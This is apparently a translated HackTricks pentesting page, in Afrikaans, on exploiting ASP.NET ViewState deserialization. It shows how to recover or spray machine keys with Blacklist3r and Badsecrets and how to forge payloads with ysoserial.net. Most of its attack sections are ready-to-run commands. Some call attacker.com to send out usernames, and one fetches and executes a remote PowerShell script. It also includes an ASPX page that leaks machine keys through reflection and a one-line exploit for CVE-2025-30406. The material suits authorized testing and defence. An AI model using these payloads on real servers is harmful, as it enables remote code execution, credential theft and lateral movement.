# Uitbuiting van __VIEWSTATE sonder om die geheime te ken

{{#include ../../banners/hacktricks-training.md}}



## Wat is ViewState

**ViewState** dien as die standaardmeganisme in ASP.NET om bladsy- en kontrolelnedata oor webbladsye te behou. Tydens die rendering van 'n bladsy se HTML word die huidige toestand van die bladsy en waardes wat tydens 'n postback bewaar moet word, geserialiseer in base64-geënkodeerde stringe. Hierdie stringe word dan in versteekte ViewState-velde geplaas.

ViewState-inligting kan gekarakteriseer word deur die volgende eienskappe of hul kombinasies:

- **Base64**:
- Hierdie formaat word gebruik wanneer albei `EnableViewStateMac` en `ViewStateEncryptionMode` attributen op false gestel is.
- **Base64 + MAC (Message Authentication Code) Enabled**:
- MAC word geaktiveer deur die `EnableViewStateMac` attribuut op true te stel. Dit bied integriteitsverifikasie vir ViewState-data.
- **Base64 + Encrypted**:
- Enkripsie word toegepas wanneer die `ViewStateEncryptionMode` attribuut op true gestel is, wat die vertroulikheid van ViewState-data verseker.

## Toetsgevalle

Die beeld is 'n tabel wat verskillende konfigurasies vir ViewState in ASP.NET uitbeeld gebaseer op die .NET-frameworkweergawe. Hier is 'n opsomming van die inhoud:

1. Vir enige .NET-weergawe, wanneer beide MAC en Enkripsie gedeaktiveer is, is 'n MachineKey nie nodig nie, en is daar dus geen toepaslike metode om dit te identifiseer nie.
2. Vir weergawes onder 4.5, as MAC geaktiveer is maar Enkripsie nie, word 'n MachineKey benodig. Die metode om die MachineKey te identifiseer word verwys as "Blacklist3r."
3. Vir weergawes onder 4.5, ongeag of MAC geaktiveer of gedeaktiveer is, indien Enkripsie geaktiveer is, is 'n MachineKey benodig. Die identifikasie van die MachineKey is 'n taak vir "Blacklist3r - Future Development."
4. Vir weergawes 4.5 en hoër vereis alle kombinasies van MAC en Enkripsie (of beide true is, of een true en die ander false) 'n MachineKey. Die MachineKey kan geïdentifiseer word met behulp van "Blacklist3r."

### Toetsgeval: 1 – EnableViewStateMac=false and viewStateEncryptionMode=false

Dit is ook moontlik om die ViewStateMAC heeltemal te deaktiveer deur die `AspNetEnforceViewStateMac` registerwaarde op nul te stel in:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
**Identifisering van ViewState-eienskappe**

Jy kan probeer bepaal of ViewState deur MAC beskerm word deur 'n versoek wat hierdie parameter bevat met BurpSuite vas te vang. As MAC nie gebruik word om die parameter te beskerm nie, kan jy dit exploit met [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"
```
### Test case 1.5 – Soos Test case 1 maar die ViewState cookie word nie deur die bediener gestuur nie

Ontwikkelaars kan **verwyder ViewState** sodat dit nie deel van 'n HTTP Request word nie (die gebruiker sal hierdie cookie nie ontvang nie).\
Men mag aanneem dat as **ViewState** **nie teenwoordig is nie**, hul implementering **veilig** is teen enige potensiële kwesbaarhede wat voortspruit uit ViewState deserialization.\
Dit is egter nie die geval nie. As ons die **ViewState parameter** by die request body voeg en ons serialized payload wat met ysoserial geskep is stuur, sal ons steeds in staat wees om **code execution** te bewerkstellig soos in **Case 1** aangetoon.

### Toetsgeval: 2 – .Net < 4.5 en EnableViewStateMac=true & ViewStateEncryptionMode=false

Om **ViewState MAC** vir 'n **specific page** te enable, moet ons die volgende veranderinge aan 'n spesifieke aspx-lêer maak:
```bash
<%@ Page Language="C#" AutoEventWireup="true" CodeFile="hello.aspx.cs" Inherits="hello" enableViewStateMac="True"%>
```
Ons kan dit ook vir die **algehele** toepassing doen deur dit in die **web.config**-lêer soos hieronder getoon in te stel:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
<system.web>
<customErrors mode="Off" />
<machineKey validation="SHA1" validationKey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45" />
<pages enableViewStateMac="true" />
</system.web>
</configuration>
```
Aangesien die parameter hierdie keer deur 'n MAC beskerm is, moet ons eers die gebruikte sleutel hê om die aanval suksesvol uit te voer.

Jy kan probeer om [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) te gebruik om die gebruikte sleutel te vind.
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"

--encrypteddata : __VIEWSTATE parameter value of the target application
--modifier : __VIWESTATEGENERATOR parameter value
```
[**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) is nog 'n instrument wat bekende machineKeys kan identifiseer. Dit is in Python geskryf, dus in teenstelling met Blacklist3r is daar geen Windows-afhanklikheid nie. Vir .NET viewstates is daar 'n "python blacklist3r" hulpmiddel, wat die vinnigste manier is om dit te gebruik.

Dit kan óf direk voorsien word van die viewstate en generator:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --viewstate /wEPDwUJODExMDE5NzY5ZGQMKS6jehX5HkJgXxrPh09vumNTKQ== --generator EDD8C9AE
```
![https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png](https://user-images.githubusercontent.com/24899338/227034640-662b6aad-f8b9-49e4-9a6b-62a5f6ae2d60.png)

Of, dit kan direk aan die teiken-URL koppel en probeer die viewstate uit die HTML uittrek:
```
pip install badsecrets
git clone https://github.com/blacklanternsecurity/badsecrets
cd badsecrets
python examples/blacklist3r.py --url http://vulnerablesite/vulnerablepage.aspx
```
![https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png](https://user-images.githubusercontent.com/24899338/227034654-e8ad9648-6c0e-47cb-a873-bf97623a0089.png)

Om kwesbare viewstates op skaal te soek, saam met subdomain enumeration, kan die `badsecrets` [**BBOT**](exploiting-__viewstate-parameter.md) module gebruik word:
```
bbot -f subdomain-enum -m badsecrets -t evil.corp
```
![https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png](https://user-images.githubusercontent.com/24899338/227028780-950d067a-4a01-481f-8e11-41fabed1943a.png)

As jy gelukkig is en die key gevind word, kan jy met die attack voortgaan deur [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)**:**
```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

--generator = {__VIWESTATEGENERATOR parameter value}
```
In gevalle waar die `_VIEWSTATEGENERATOR` parameter **nie deur die bediener gestuur word nie**, **hoef jy nie** die `--generator` parameter **te verskaf**, **maar hierdie**:
```bash
--apppath="/" --path="/hello.aspx"
```
### Uitbuiting van hergebruikte `<machineKey>`-waardes op skaal

Ink Dragon (2025) het getoon hoe gevaarlik dit is wanneer administrateurs **die voorbeeld `<machineKey>`-blokke wat in Microsoft docs, StackOverflow-antwoorde of vendor blogs gepubliseer is, kopieer**. Sodra 'n enkele teiken die sleutels leaks of oor die farm hergebruik, kan enige ander ASP.NET-bladsy wat ViewState vertrou, op afstand gekaap word sonder enige addisionele kwesbaarheid.

1. **Bou 'n kandidaatwoordlys** met die leaked `validationKey`/`decryptionKey` pare (bv. skraap openbare repos, Microsoft blogposte, of sleutels wat van een gasheer in die farm herstel is) en voer dit in Blacklist3r/Badsecrets in:

```bash
AspDotNetWrapper.exe --keypath reused_machinekeys.txt --url https://target/_layouts/15/ToolPane.aspx --decrypt --purpose=viewstate --modifier=<VIEWSTATEGENERATOR>
# or let Badsecrets spray the list
bbot -f subdomain-enum -m badsecrets --badsecrets-keylist reused_machinekeys.txt -t sharepoint.customer.tld
```

Die gereedskap onderteken herhaaldelik 'n goedaardige `__VIEWSTATE`-blob met elke kandidaat-sleutel totdat die bediener die MAC aanvaar, wat bewys dat die sleutel geldig is.
2. **Maak die kwaadwillige ViewState** sodra die sleutelpaar bekend is. As enkripsie gedeaktiveer is benodig jy net die `validationKey`. As enkripsie geaktiveer is, sluit die ooreenstemmende `decryptionKey` in sodat die payload die decrypt → deserialize-pad oorleef:

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell -c iwr http://x.x.x.x/a.ps1|iex" \
--validationkey "$VALIDATION" --decryptionkey "$DECRYPTION" --validationalg="SHA1" --generator=<VIEWSTATEGENERATOR>
```

Operators plaas dikwels skyf-gebaseerde launchers (bv. PrintNotifyPotato, ShadowPad loaders, ens.) reg in die payload omdat dit uitgevoer word as die IIS worker (`w3wp.exe`).
3. **Pivot lateraal** deur dieselfde `<machineKey>` oor suster SharePoint/IIS-nodes te hergebruik. Sodra een bediener gekompromitteer is, kan jy die sleutel hergebruik om elke ander bediener te tref wat nooit sy konfigurasie geroteer het nie.

### Toetsgeval: 3 – .Net < 4.5 en EnableViewStateMac=true/false en ViewStateEncryptionMode=true

In hierdie geval is dit nie bekend of die parameter met 'n MAC beskerm is nie. Dan is die waarde waarskynlik geënkripteer en jy sal **die Machine Key nodig hê om jou payload te enkripteer** om die kwesbaarheid te eksploiteer.

**In hierdie geval is die** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **module in ontwikkeling...**

**Voor .NET 4.5**, kan ASP.NET 'n **unencrypted** \_`__VIEWSTATE`\_ parameter van gebruikers **aanvaar** selfs as **`ViewStateEncryptionMode`** op _**Always**_ gestel is. ASP.NET **kyk net** na die teenwoordigheid van die **`__VIEWSTATEENCRYPTED`** parameter in die versoek. **As hierdie parameter verwyder word en die ongeënkripteerde payload gestuur word, sal dit steeds verwerk word.**

Daarom, as die aanvallers 'n manier vind om die Machinekey via 'n ander vuln soos file traversal te kry, kan die [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) opdrag wat in **Case 2** gebruik is, gebruik word om RCE uit te voer met behulp van die ViewState deserialization-kwesbaarheid.

- Verwyder die `__VIEWSTATEENCRYPTED` parameter uit die versoek om die ViewState deserialization-kwesbaarheid te eksploiteer, anders sal dit 'n Viewstate MAC validation error teruggee en die eksploitasie sal misluk.

### Toetsgeval: 4 – .Net >= 4.5 en EnableViewStateMac=true/false en ViewStateEncryptionMode=true/false behalwe beide attributte vir false

Ons kan die gebruik van die ASP.NET-framework afdwing deur die onderstaande parameter binne die web.config-lêer te spesifiseer soos hieronder getoon.
```xml
<httpRuntime targetFramework="4.5" />
```
Alternatiewelik kan dit gedoen word deur die onderstaande opsie in die `machineKey`-parameter van die web.config-lêer te spesifiseer.
```bash
compatibilityMode="Framework45"
```
Soos in die vorige, is die **waarde versleuteld.** Dan, **om 'n valid payload te stuur, benodig die attacker die key.**

Jy kan probeer om [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) te gebruik om die key wat gebruik word te vind:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
Vir 'n meer gedetailleerde beskrywing van IISDirPath en TargetPagePath [refer here](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

Of, met [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (met 'n generatorwaarde):
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

Sodra 'n geldige Machine key geïdentifiseer is, **die volgende stap is om 'n serialized payload te genereer met behulp van** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
As jy die waarde van `__VIEWSTATEGENERATOR` het kan jy probeer om die `--generator` parameter met daardie waarde te **gebruik** en die parameters `--path` en `--apppath` te **weglating**

![](https://notsosecure.com/sites/all/assets/group/nss_uploads/2019/06/4.2.png)

'n Suksesvolle benutting van die ViewState deserialisasie kwesbaarheid sal lei tot 'n out-of-band versoek na 'n aanvallersbeheerde bediener, wat die gebruikersnaam insluit. Hierdie soort exploit word gedemonstreer in 'n proof of concept (PoC) wat gevind kan word in die hulpbron getiteld "Exploiting ViewState Deserialization using Blacklist3r and YsoSerial.NET". Vir meer besonderhede oor hoe die benuttingsproses werk en hoe om gereedskap soos Blacklist3r te gebruik om die MachineKey te identifiseer, kan jy die beskikbare [PoC of Successful Exploitation](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC) raadpleeg.

### Test Case 6 – ViewStateUserKeys word gebruik

Die **ViewStateUserKey** eienskap kan gebruik word om teen 'n **CSRF attack** te **verdedig**. As so 'n sleutel in die toepassing gedefinieer is en ons probeer die **ViewState** payload genereer met die metodes wat tot nou bespreek is, sal die **payload nie deur die toepassing verwerk word nie**.\
Jy moet een ekstra parameter gebruik om die payload korrek te skep:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### Resultaat van 'n Suksesvolle Uitbuiting <a href="#poc" id="poc"></a>

Vir al die toetsgevalle, as die ViewState YSoSerial.Net payload **suksesvol** werk, reageer die bediener met “**500 Internal server error**” met reaksie-inhoud “**The state information is invalid for this page and might be corrupted**” en ons kry die OOB request.

Sien [verdere inligting hier](<https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/[**https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)/README.md>)

### Uitlees van ASP.NET Machine Keys via Reflection (SharPyShell/SharePoint ToolShell)

Aanvallers wat in staat is om **upload or execute arbitrary ASPX code** binne die teiken web root uit te voer, kan direk die geheime sleutels wat `__VIEWSTATE` beskerm retrieve in plaas van dit te bruteforcing.
'n minimale payload wat die keys leak, benut interne .NET-klasses deur reflection:
```csharp
<%@ Import Namespace="System.Web.Configuration" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
public void Page_Load(object sender, EventArgs e)
{
var asm = Assembly.Load("System.Web");
var sect = asm.GetType("System.Web.Configuration.MachineKeySection");
var m = sect.GetMethod("GetApplicationConfig", BindingFlags.Static | BindingFlags.NonPublic);
var cfg = (MachineKeySection)m.Invoke(null, null);
// Output: ValidationKey|DecryptionKey|Algorithm|CompatibilityMode
Response.Write($"{cfg.ValidationKey}|{cfg.DecryptionKey}|{cfg.Decryption}|{cfg.CompatibilityMode}");
}
</script>
```
Wanneer die bladsy aangevra word, toon dit die **ValidationKey**, **DecryptionKey**, die enkripsie-algoritme en die ASP.NET compatibility mode. Hierdie waardes kan nou direk in **ysoserial.net** ingevoer word om 'n geldige, ondertekende `__VIEWSTATE` gadget te skep:
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate \
-c "powershell -nop -c \"whoami\"" \
--generator=<VIEWSTATE_GENERATOR> \
--validationkey=<VALIDATION_KEY> --validationalg=<VALIDATION_ALG> \
--decryptionkey=<DECRYPTION_KEY> --decryptionalg=<DECRYPTION_ALG> \
--islegacy --minify
curl "http://victim/page.aspx?__VIEWSTATE=<PAYLOAD>"
```
This **key-exfiltration primitive** is in 2025 massaal misbruik op on-prem SharePoint-bedieners aangewend ("ToolShell" – CVE-2025-53770/53771), maar dit is van toepassing op enige ASP.NET-toepassing waar 'n aanvaller bedienerkant-kode kan uitvoer.

## 2024-2025 Werklike-uitbuitingscenario's en Hard-gekodeerde Machine Keys

### Microsoft “openbaar bekendgemaakte machine keys” golf (Dec 2024 – Feb 2025)
Microsoft Threat Intelligence het massale uitbuiting van ASP.NET-webwerwe gerapporteer waar die *machineKey* voorheen op publieke bronne leaked is (GitHub gists, blog posts, paste sites). Teenstanders het hierdie sleutels geënumeer en geldige `__VIEWSTATE` gadgets gegenereer met die nuwer `ysoserial.net` 1.41 `--minify` en `--islegacy` vlagte om WAF-lengtegrense te ontduik:
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "whoami" \
--validationkey=<LEAKED_VALIDATION_KEY> --validationalg=SHA1 \
--decryptionkey=<LEAKED_DECRYPTION_KEY> --decryptionalg=AES \
--generator=<VIEWSTATEGEN> --minify
```
Teikens wat steeds dieselfde statiese sleutels oor farms hergebruik, bly oneindig kwesbaar; sodra hulle na `AutoGenerate`-waardes migreer, verval die spray technique, dus prioritiseer legacy deployments wat steeds hard-coded materiaal blootstel.

### CVE-2025-30406 – Gladinet CentreStack / Triofox hard-coded keys
Kudelski Security het ontdek dat verskeie CentreStack / Triofox-releases met identiese `machineKey`-waardes verskaf is, wat unauthenticated remote code execution deur ViewState forgery (CVE-2025-30406) moontlik maak.

Eenreël exploit:
```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "calc.exe" \
--validationkey=ACC97055B2A494507D7D7C92DC1C854E8EA7BF4C \
--validationalg=SHA1 \
--decryptionkey=1FB1DEBB8B3B492390B2ABC63E6D1B53DC9CA2D7 \
--decryptionalg=AES --generator=24D41AAB --minify \
| curl -d "__VIEWSTATE=$(cat -)" http://victim/portal/loginpage.aspx
```
Gerepareer in CentreStack 16.4.10315.56368 / Triofox 16.4.10317.56372 – opgradeer of vervang die sleutels onmiddellik.

## Verwysings

- [Uitbuiting van ViewState deserialisering using Blacklist3r and YSoSerial.NET](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
- [Diepduik in .NET ViewState deserialisering en die uitbuiting daarvan](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
- [Uitbuiting van deserialisering in ASP.NET via ViewState (Soroush Dalili, 2019)](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
- [Inleiding tot badsecrets – vinnige machineKey-ontdekking](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)
- [SharePoint “ToolShell” uitbuitingketting (Eye Security, 2025)](https://research.eye.security/sharepoint-under-siege/)
- [Microsoft Security – Kode-inspuitingaanvalle misbruik makende van publiek bekendgemaakte ASP.NET machine keys (Feb 6 2025)](https://www.microsoft.com/en-us/security/blog/2025/02/06/code-injection-attacks-using-publicly-disclosed-asp-net-machine-keys/)
- [Kudelski Security advisory – Gladinet CentreStack / Triofox RCE CVE-2025-30406 (Apr 16 2025)](https://research.kudelskisecurity.com/2025/04/16/gladinet-centrestack-and-gladinet-triofox-critical-rce-cve-2025-30406/)
- [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
- [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)
- [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
- [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)
- [SharePoint “ToolShell” exploitation chain (Eye Security, 2025)](https://research.eye.security/sharepoint-under-siege/)
- [Check Point Research – Inside Ink Dragon: Blootlegging van die relaisnetwerk en interne werksaamhede van 'n sluipende offensiewe operasie](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)



{{#include ../../banners/hacktricks-training.md}}
